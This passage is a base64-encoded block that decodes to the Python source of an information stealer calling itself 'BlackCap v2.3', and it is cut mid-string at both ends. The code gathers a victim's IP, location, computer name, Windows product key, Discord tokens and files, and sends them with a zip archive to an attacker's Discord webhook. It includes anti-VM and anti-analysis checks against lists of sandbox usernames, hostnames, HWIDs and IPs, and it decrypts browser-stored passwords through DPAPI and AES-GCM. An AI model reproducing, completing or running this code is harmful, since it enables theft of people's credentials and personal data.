oMikucG5nIiwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6IGYiQmxhY2tDYXAgdjIuMyIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ1cmwiOiAiaHR0cHM6Ly9naXRodWIuY29tL0tTQ0hkc2MiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvRGVzdHJ1Q29yZC1JbmplY3QvbWFpbi9ibGFja2NhcC5naWYiLAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMzc0Mjc2LAogICAgICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiW0JsYWNrQ2FwIGhhcyBHZW8gTG9jYWxpc2VkIHRoaXMgZ3V5XSh7c2VsZi5nb29nbGVtYXB9KSIsCiAgICAgICAgICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiXHUyMDBiIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiIiJgYGBmaXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJUOKAr+KAr3tzZWxmLmlwLnJlcGxhY2UoIiAiLCAi4oCvIikgaWYgc2VsZi5pcCBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9yZzrigK/igK97c2VsZi5vcmcucmVwbGFjZSgiICIsICLigK8iKSBpZiBzZWxmLm9yZyBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENpdHk64oCv4oCve3NlbGYuY2l0eS5yZXBsYWNlKCIgIiwgIuKAryIpIGlmIHNlbGYuY2l0eSBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlZ2lvbjrigK/igK97c2VsZi5yZWdpb24ucmVwbGFjZSgiICIsICLigK8iKSBpZiBzZWxmLnJlZ2lvbiBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvdW50cnnigK/igK97c2VsZi5jb3VudHJ5LnJlcGxhY2UoIiAiLCAi4oCvIikgaWYgc2VsZi5jb3VudHJ5IGVsc2UgIk4vQSJ9YGBgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIucmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiICIsICLigK8iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIlx1MjAwYiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIiIiYGBgZml4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXLigK9OYW1lOuKAr3tjb21wdXRlcl92aWN0aW0ucmVwbGFjZSgiICIsICLigK8iKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXaW5kb3dz4oCvS2V5OuKAr3tzZWxmLmtleV93aW5kb3dzX2ZpbmQucmVwbGFjZSgiICIsICLigK8iKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXaW5kb3dz4oCvVmVyOuKAr3tzZWxmLm5ldmVyX3dpbmQucmVwbGFjZSgiICIsICLigK8iKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXNr4oCvU3RvY2thZ2U64oCve3N0b3JhZ2Vfc3BhY2V9R0IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSYW3igK9TdG9ja2FnZTrigK97ZmFzdF9tZW1vcnlfc3RvcmFnZX1HQmBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiLnJlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiAiLCAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlLAogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICIqKi0gVG9rZW5zOioqIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiIiJgYGB5YW1sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAge3Rva2VucyBpZiB0b2tlbnMgZWxzZSAidG9rZW5z4oCvbm904oCvZm91bmQifWBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiLnJlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiAiLCAi4oCvIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZSwKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiBmaWxlQ291bnQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIiIiYGBgaW5pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtmaWxlc19mb3VuZC5zdHJpcCgpfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF1gYGAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiIi5yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIgIiwgIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJCbGFjayBDYXAgQ3JlYXRlIEJ5IEtTQ0jjg7todHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYyIKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgIH0KCiAgICAgICAgd2l0aCBvcGVuKF96aXBmaWxlLCAicmIiKSBhcyBmOgogICAgICAgICAgICBpZiBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjIGluIHNlbGYuZGlzY29yZF93ZWJob29rOgogICAgICAgICAgICAgICAgaHR0cHgucG9zdChzZWxmLmRpc2NvcmRfd2ViaG9vaywganNvbj1lbWJlZCkKICAgICAgICAgICAgICAgIGh0dHB4LnBvc3Qoc2VsZi5kaXNjb3JkX3dlYmhvb2ssIGZpbGVzPXsidXBsb2FkX2ZpbGUiOiBmfSkKICAgICAgICBvcy5yZW1vdmUoX3ppcGZpbGUpCgoKY2xhc3MgTm9EZWJ1Z2coRnVuY3Rpb25zKToKICAgIGluVk0gPSBGYWxzZQoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLnByb2Nlc3NlcyA9IGxpc3QoKQoKICAgICAgICBzZWxmLnVzZXJzX2Jsb2NrZWQgPSBbCiAgICAgICAgICAgICJXREFHVXRpbGl0eUFjY291bnQiLAogICAgICAgICAgICAiQnZKQ2hSUG5zeG4iLAogICAgICAgICAgICAiSGFycnkgSm9obnNvbiIsCiAgICAgICAgICAgICJTcWdGT2YzRyIsCiAgICAgICAgICAgICJSR3pjQlV5cnpuUmVnIiwKICAgICAgICAgICAgImg3ZGsxeFByIiwKICAgICAgICAgICAgIlJvYmVydCIsCiAgICAgICAgICAgICJBYmJ5IiwKICAgICAgICAgICAgIlBldGVyIFdpbHNvbiIsCiAgICAgICAgICAgICJobWFyYyIsCiAgICAgICAgICAgICJwYXRleCIsCiAgICAgICAgICAgICJKT0hOLVBDIiwKICAgICAgICAgICAgIlJEaEowQ05GZXZ6WCIsCiAgICAgICAgICAgICJrRWVjZk13Z2oiLAogICAgICAgICAgICAiRnJhbmsiLAogICAgICAgICAgICAiOE5sMENvbE5RNWJxIiwKICAgICAgICAgICAgIkxpc2EiLAogICAgICAgICAgICAiSm9obiIsCiAgICAgICAgICAgICJnZW9yZ2UiLAogICAgICAgICAgICAiUHhtZFVPcFZ5eCIsCiAgICAgICAgICAgICI4Vml6U00iLAogICAgICAgICAgICAidzBmanVPVm1DY1A1QSIsCiAgICAgICAgICAgICJsbVZ3amo5YiIsCiAgICAgICAgICAgICJQcU9OakhWd2V4c1MiLAogICAgICAgICAgICAiM3UydjltOCIsCiAgICAgICAgICAgICJKdWxpYSIsCiAgICAgICAgICAgICJIRVVlUnpsIiwKICAgICAgICBdCiAgICAgICAgc2VsZi5wY25hbWVfYmxvY2tlZCA9IFsKICAgICAgICAgICAgIkRFU0tUT1AtQ0RMTlZPUSIsCiAgICAgICAgICAgICJCRUU3MzcwQy04QzBDLTQiLAogICAgICAgICAgICAiREVTS1RPUC1OQUtGRk1UIiwKICAgICAgICAgICAgIldJTi01RTA3Q09TOUFMUiIsCiAgICAgICAgICAgICJCMzBGMDI0Mi0xQzZBLTQiLAogICAgICAgICAgICAiREVTS1RPUC1WUlNRTEFHIiwKICAgICAgICAgICAgIlE5SUFUUktQUkgiLAogICAgICAgICAgICAiWEM2NFpCIiwKICAgICAgICAgICAgIkRFU0tUT1AtRDAxOUdETSIsCiAgICAgICAgICAgICJERVNLVE9QLVdJOENMRVQiLAogICAgICAgICAgICAiU0VSVkVSMSIsCiAgICAgICAgICAgICJMSVNBLVBDIiwKICAgICAgICAgICAgIkpPSE4tUEMiLAogICAgICAgICAgICAiREVTS1RPUC1CMFQ5M0Q2IiwKICAgICAgICAgICAgIkRFU0tUT1AtMVBZS1AyOSIsCiAgICAgICAgICAgICJERVNLVE9QLTFZMjQzM1IiLAogICAgICAgICAgICAiV0lMRVlQQyIsCiAgICAgICAgICAgICJXT1JLIiwKICAgICAgICAgICAgIjZDNEU3MzNGLUMyRDktNCIsCiAgICAgICAgICAgICJSQUxQSFMtUEMiLAogICAgICAgICAgICAiREVTS1RPUC1XRzNNWUpTIiwKICAgICAgICAgICAgIkRFU0tUT1AtN1hDNkdFWiIsCiAgICAgICAgICAgICJERVNLVE9QLTVPVjlTME8iLAogICAgICAgICAgICAiUWFyWmhyZEJwaiIsCiAgICAgICAgICAgICJPUkVMRUVQQyIsCiAgICAgICAgICAgICJBUkNISUJBTERQQyIsCiAgICAgICAgICAgICJKVUxJQS1QQyIsCiAgICAgICAgICAgICJkMWJuSmtmVmxIIiwKICAgICAgICAgICAgIkRFU0tUT1AtQjBUOTNENiIsCiAgICAgICAgXQogICAgICAgIHNlbGYuaHdpZF9ibG9ja2VkID0gWwogICAgICAgICAgICAiN0FCNUM0OTQtMzlGNS00OTQxLTkxNjMtNDdGNTRENkQ1MDE2IiwKICAgICAgICAgICAgIjAzMkUwMkI0LTA0OTktMDVDMy0wODA2LTNDMDcwMDA4MDAwOSIsCiAgICAgICAgICAgICIwM0RFMDI5NC0wNDgwLTA1REUtMUEwNi0zNTA3MDAwODAwMDkiLAogICAgICAgICAgICAiMTExMTExMTEtMjIyMi0zMzMzLTQ0NDQtNTU1NTU1NTU1NTU1IiwKICAgICAgICAgICAgIjZGM0NBNUVDLUJFQzktNEE0RC04Mjc0LTExMTY4RjY0MDA1OCIsCiAgICAgICAgICAgICJBREVFRUU5RS1FRjBBLTZCODQtQjE0Qi1CODNBNTRBRkM1NDgiLAogICAgICAgICAgICAiNEM0QzQ1NDQtMDA1MC0zNzEwLTgwNTgtQ0FDMDRGNTkzNDRBIiwKICAgICAgICAgICAgIjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLUFDMUY2QkQwNDk3MiIsCiAgICAgICAgICAgICI3OUFGNTI3OS0xNkNGLTQwOTQtOTc1OC1GODhBNjE2RDgxQjQiLAogICAgICAgICAgICAiNUJEMjRENTYtNzg5Ri04NDY4LTdDREMtQ0FBNzIyMkNDMTIxIiwKICAgICAgICAgICAgIjQ5NDM0RDUzLTAyMDAtOTA2NS0yNTAwLTY1OTAyNTAwRTQzOSIsCiAgICAgICAgICAgICI0OTQzNEQ1My0wMjAwLTkwMzYtMjUwMC0zNjkwMjUwMEYwMjIiLAogICAgICAgICAgICAiNzc3RDg0QjMtODhEMS00NTFDLTkzRTQtRDIzNTE3NzQyMEE3IiwKICAgICAgICAgICAgIjQ5NDM0RDUzLTAyMDAtOTAzNi0yNTAwLTM2OTAyNTAwMEM2NSIsCiAgICAgICAgICAgICJCMTExMjA0Mi01MkU4LUUyNUItMzY1NS02QTRGNTQxNTVEQkYiLAogICAgICAgICAgICAiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtQUMxRjZCRDA0OEZFIiwKICAgICAgICAgICAgIkVCMTY5MjRCLUZCNkQtNEZBMS04NjY2LTE3QjkxRjYyRkIzNyIsCiAgICAgICAgICAgICJBMTVBOTMwQy04MjUxLTk2NDUtQUY2My1FNDVBRDcyOEMyMEMiLAogICAgICAgICAgICAiNjdFNTk1RUItNTRBQy00RkYwLUI1RTMtM0RBN0M3QjU0N0UzIiwKICAgICAgICAgICAgIkM3RDIzMzQyLUE1RDQtNjhBMS01OUFDLUNGNDBGNzM1QjM2MyIsCiAgICAgICAgICAgICI2MzIwMzM0Mi0wRUIwLUFBMUEtNERGNS0zRkIzN0RCQjA2NzAiLAogICAgICAgICAgICAiNDRCOTRENTYtNjVBQi1EQzAyLTg2QTAtOTgxNDNBNzQyM0JGIiwKICAgICAgICAgICAgIjY2MDgwMDNGLUVDRTQtNDk0RS1CMDdFLTFDNDYxNUQxRDkzQyIsCiAgICAgICAgICAgICJEOTE0MjA0Mi04RjUxLTVFRkYtRDVGOC1FRTlBRTNEMTYwMkEiLAogICAgICAgICAgICAiNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDAzQUYwIiwKICAgICAgICAgICAgIjhCNEU4Mjc4LTUyNUMtNzM0My1CODI1LTI4MEFFQkNEM0JDQiIsCiAgICAgICAgICAgICI0RDREREM5NC1FMDZDLTQ0RjQtOTVGRS0zM0ExQURBNUFDMjciLAogICAgICAgICAgICAiQkI2NEUwNDQtODdCQS1DODQ3LUJDMEEtQzc5N0QxQTE2QTUwIiwKICAgICAgICAgICAgIjJFNkZCNTk0LTlENTUtNDQyNC04RTc0LUNFMjVBMjVFMzZCMCIsCiAgICAgICAgICAgICI0MkE4MjA0Mi0zRjEzLTUxMkYtNUUzRC02QkY0RkZGRDg1MTgiLAogICAgICAgIF0KICAgICAgICBzZWxmLmlwc19ibG9ja2VkID0gWwogICAgICAgICAgICAiODguMTMyLjIzMS43MSIsCiAgICAgICAgICAgICI3OC4xMzkuOC41MCIsCiAgICAgICAgICAgICIyMC45OS4xNjAuMTczIiwKICAgICAgICAgICAgIjg4LjE1My4xOTkuMTY5IiwKICAgICAgICAgICAgIjg0LjE0Ny42Mi4xMiIsCiAgICAgICAgICAgICIxOTQuMTU0Ljc4LjE2MCIsCiAgICAgICAgICAgICI5Mi4yMTEuMTA5LjE2MCIsCiAgICAgICAgICAgICIxOTUuNzQuNzYuMjIyIiwKICAgICAgICAgICAgIjE4OC4xMDUuOTEuMTE2IiwKICAgICAgICAgICAgIjM0LjEwNS4xODMuNjgiLAogICAgICAgICAgICAiOTIuMjExLjU1LjE5OSIsCiAgICAgICAgICAgICI3OS4xMDQuMjA5LjMzIiwKICAgICAgICAgICAgIjk1LjI1LjIwNC45MCIsCiAgICAgICAgICAgICIzNC4xNDUuODkuMTc0IiwKICAgICAgICAgICAgIjEwOS43NC4xNTQuOTAiLAogICAgICAgICAgICAiMTA5LjE0NS4xNzMuMTY5IiwKICAgICAgICAgICAgIjM0LjE0MS4xNDYuMTE0IiwKICAgICAgICAgICAgIjIxMi4xMTkuMjI3LjE1MSIsCiAgICAgICAgICAgICIxOTUuMjM5LjUxLjU5IiwKICAgICAgICAgICAgIjE5Mi40MC41Ny4yMzQiLAogICAgICAgICAgICAiNjQuMTI0LjEyLjE2MiIsCiAgICAgICAgICAgICIzNC4xNDIuNzQuMjIwIiwKICAgICAgICAgICAgIjE4OC4xMDUuOTEuMTczIiwKICAgICAgICAgICAgIjEwOS43NC4xNTQuOTEiLAogICAgICAgICAgICAiMzQuMTA1LjcyLjI0MSIsCiAgICAgICAgICAgICIxMDkuNzQuMTU0LjkyIiwKICAgICAgICAgICAgIjIxMy4zMy4xNDIuNTAiLAogICAgICAgICAgICAiMTA5Ljc0LjE1NC45MSIsCiAgICAgICAgICAgICI5My4yMTYuNzUuMjA5IiwKICAgICAgICAgICAgIjE5Mi44Ny4yOC4xMDMiLAogICAgICAgICAgICAiODguMTMyLjIyNi4yMDMiLAogICAgICAgICAgICAiMTk1LjE4MS4xNzUuMTA1IiwKICAgICAgICAgICAgIjg4LjEzMi4yMjUuMTAwIiwKICAgICAgICAgICAgIjkyLjIxMS4xOTIuMTQ0IiwKICAgICAgICAgICAgIjM0LjgzLjQ2LjEzMCIsCiAgICAgICAgICAgICIxODguMTA1LjkxLjE0MyIsCiAgICAgICAgICAgICIzNC44NS4yNDMuMjQxIiwKICAgICAgICAgICAgIjM0LjE0MS4yNDUuMjUiLAogICAgICAgICAgICAiMTc4LjIzOS4xNjUuNzAiLAogICAgICAgICAgICAiODQuMTQ3LjU0LjExMyIsCiAgICAgICAgICAgICIxOTMuMTI4LjExNC40NSIsCiAgICAgICAgICAgICI5NS4yNS44MS4yNCIsCiAgICAgICAgICAgICI5Mi4yMTEuNTIuNjIiLAogICAgICAgICAgICAiODguMTMyLjIyNy4yMzgiLAogICAgICAgICAgICAiMzUuMTk5LjYuMTMiLAogICAgICAgICAgICAiODAuMjExLjAuOTciLAogICAgICAgICAgICAiMzQuODUuMjUzLjE3MCIsCiAgICAgICAgICAgICIyMy4xMjguMjQ4LjQ2IiwKICAgICAgICAgICAgIjM1LjIyOS42OS4yMjciLAogICAgICAgICAgICAiMzQuMTM4Ljk2LjIzIiwKICAgICAgICAgICAgIjE5Mi4yMTEuMTEwLjc0IiwKICAgICAgICAgICAgIjM1LjIzNy40Ny4xMiIsCiAgICAgICAgICAgICI4Ny4xNjYuNTAuMjEzIiwKICAgICAgICAgICAgIjM0LjI1My4yNDguMjI4IiwKICAgICAgICAgICAgIjIxMi4xMTkuMjI3LjE2NyIsCiAgICAgICAgICAgICIxOTMuMjI1LjE5My4yMDEiLAogICAgICAgICAgICAiMzQuMTQ1LjE5NS41OCIsCiAgICAgICAgICAgICIzNC4xMDUuMC4yNyIsCiAgICAgICAgICAgICIxOTUuMjM5LjUxLjMiLAogICAgICAgICAgICAiMzUuMTkyLjkzLjEwNyIsCiAgICAgICAgXQoKICAgICAgICBmb3IgZnVuYyBpbiBbc2VsZi5sYXN0X2NoZWNrLCBzZWxmLmtleXNfcmVnZXgsIHNlbGYuQ2hlY2tfYW5kX1NwZWNdOgogICAgICAgICAgICBwcm9jZXNzID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZnVuYywgZGFlbW9uPVRydWUpCiAgICAgICAgICAgIHNlbGYucHJvY2Vzc2VzLmFwcGVuZChwcm9jZXNzKQogICAgICAgICAgICBwcm9jZXNzLnN0YXJ0KCkKICAgICAgICBmb3IgdCBpbiBzZWxmLnByb2Nlc3NlczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdC5qb2luKCkKICAgICAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgZGVmIHByb2dyYW1FeGl0KHNlbGYpOgogICAgICAgIHNlbGYuX19jbGFzc19fLmluVk0gPSBUcnVlCgogICAgZGVmIGxhc3RfY2hlY2soc2VsZik6CiAgICAgICAgZm9yIHBhdGggaW4gW3IiRDpcVG9vbHMiLCByIkQ6XE9TMiIsIHIiRDpcTlQzWCJdOgogICAgICAgICAgICBpZiBudHBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCiAgICAgICAgZm9yIHVzZXIgaW4gc2VsZi51c2Vyc19ibG9ja2VkOgogICAgICAgICAgICBpZiBsb2dpbl9pbmZvID09IHVzZXI6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBmb3IgcGNOYW1lIGluIHNlbGYucGNuYW1lX2Jsb2NrZWQ6CiAgICAgICAgICAgIGlmIGNvbXB1dGVyX3ZpY3RpbSA9PSBwY05hbWU6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBmb3IgcGNJUCBpbiBzZWxmLmlwc19ibG9ja2VkOgogICAgICAgICAgICBpZiBzZWxmLmluZm9fbmV0d29yZCgpWzBdID09IHBjSVA6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBmb3Igd2luZG93c191dWlkIGluIHNlbGYuaHdpZF9ibG9ja2VkOgogICAgICAgICAgICBpZiBzZWxmLmluZm9fc3lzKClbMF0gPT0gd2luZG93c191dWlkOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgZGVmIENoZWNrX2FuZF9TcGVjKHNlbGYpOgogICAgICAgIGlmIGludChmYXN0X21lbW9yeV9zdG9yYWdlKSA8PSAzOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBpZiBpbnQoc3RvcmFnZV9zcGFjZSkgPD0gMTIwOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBpZiBpbnQocHN1dGlsLmNwdV9jb3VudCgpKSA8PSAxOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICBkZWYga2V5c19yZWdleChzZWxmKToKICAgICAgICByZWcxID0gb3Muc3lzdGVtKAogICAgICAgICAgICAiUkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxcU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxDbGFzc1xcezREMzZFOTY4LUUzMjUtMTFDRS1CRkMxLTA4MDAyQkUxMDMxOH1cXDAwMDBcXERyaXZlckRlc2MgMj4gbnVsIgogICAgICAgICkKICAgICAgICByZWcyID0gb3Muc3lzdGVtKAogICAgICAgICAgICAiUkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxcU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxDbGFzc1xcezREMzZFOTY4LUUzMjUtMTFDRS1CRkMxLTA4MDAyQkUxMDMxOH1cXDAwMDBcXFByb3ZpZGVyTmFtZSAyPiBudWwiCiAgICAgICAgKQogICAgICAgIGlmIChyZWcxIGFuZCByZWcyKSAhPSAxOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBoYW5kbGUgPSB3aW5yZWcuT3BlbktleSgKICAgICAgICAgICAgd2lucmVnLkhLRVlfTE9DQUxfTUFDSElORSwgIlNZU1RFTVxcQ3VycmVudENvbnRyb2xTZXRcXFNlcnZpY2VzXFxEaXNrXFxFbnVtIgogICAgICAgICkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlZ192YWwgPSB3aW5yZWcuUXVlcnlWYWx1ZUV4KGhhbmRsZSwgIjAiKVswXQogICAgICAgICAgICBpZiAoIlZNd2FyZSIgb3IgIlZCT1giKSBpbiByZWdfdmFsOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgd2lucmVnLkNsb3NlS2V5KGhhbmRsZSkKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iIGFuZCBvcy5uYW1lID09ICJudCI6CiAgICBhc3luY2lvLnJ1bihmaXJzdF9mdW5jdGlvbl9iYygpLmluaXQoKSkKbG9jYWwgPSBvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpCnJvYW1pbmcgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKVGhyZWFkbGlzdCA9IFtdCgoKZGVmIGZpbmRfaW5fY29uZmlnKGU6IHN0cikgLT4gc3RyIG9yIGJvb2wgfCBOb25lOgogICAgcmV0dXJuIF9fY29uZmlnX18uZ2V0KGUpCgoKaG9vayA9IGZpbmRfaW5fY29uZmlnKCJ5b3Vyd2ViaG9va3VybCIpCgoKY2xhc3MgREFUQV9CTE9CKFN0cnVjdHVyZSk6CiAgICBfZmllbGRzXyA9IFsoImNiRGF0YSIsIHdpbnR5cGVzLkRXT1JEKSwgKCJwYkRhdGEiLCBQT0lOVEVSKGNfY2hhcikpXQoKCmRlZiBHZXREYXRhKGJsb2Jfb3V0KToKICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpCiAgICBwYkRhdGEgPSBibG9iX291dC5wYkRhdGEKICAgIGJ1ZmZlciA9IGNfYnVmZmVyKGNiRGF0YSkKICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQogICAgd2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShwYkRhdGEpCiAgICByZXR1cm4gYnVmZmVyLnJhdwoKCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWIiIik6CiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQogICAgYnVmZmVyX2VudHJvcHkgPSBjX2J1ZmZlcihlbnRyb3B5LCBsZW4oZW50cm9weSkpCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkKICAgIGJsb2Jfb3V0ID0gREFUQV9CTE9CKCkKCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoCiAgICAgICAgYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KQogICAgKToKICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkKCgpkZWYgVmFsdWVfRGNyeXB0YWdlKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0idXRmOCIsIGVycm9ycz0iaWdub3JlIilbOjNdCiAgICBpZiBzdGFydHMgPT0gInYxMCIgb3Igc3RhcnRzID09ICJ2MTEiOgogICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCgpkZWYgUmVxdWVzdHNfbG9hZGluZyhtZXRob2RlLCB1cmwsIGRhdGE9IiIsIGZpbGVzPSIiLCBoZWFkZXJzPSIiKToKICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbWV0aG9kZSA9PSAiUE9TVCI6CiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICIiOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICAgICAgZWxpZiBmaWxlcyAhPSAiIjoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgICAgICAgICAgci5zdGF0dXNfY29kZSA9PSAyMDAgb3Igci5zdGF0dXNfY29kZSA9PSA0MTMKICAgICAgICAgICAgICAgICAgICApOiAgIyA0MTMgPSBEQVRBIFRPIEJJRwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKCmRlZiBVUkxfbGlicmFpcnlfTG9hZGluZyhob29rLCBkYXRhPSIiLCBmaWxlcz0iIiwgaGVhZGVycz0iIik6CiAgICBmb3IgaSBpbiByYW5nZSg4KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIGhl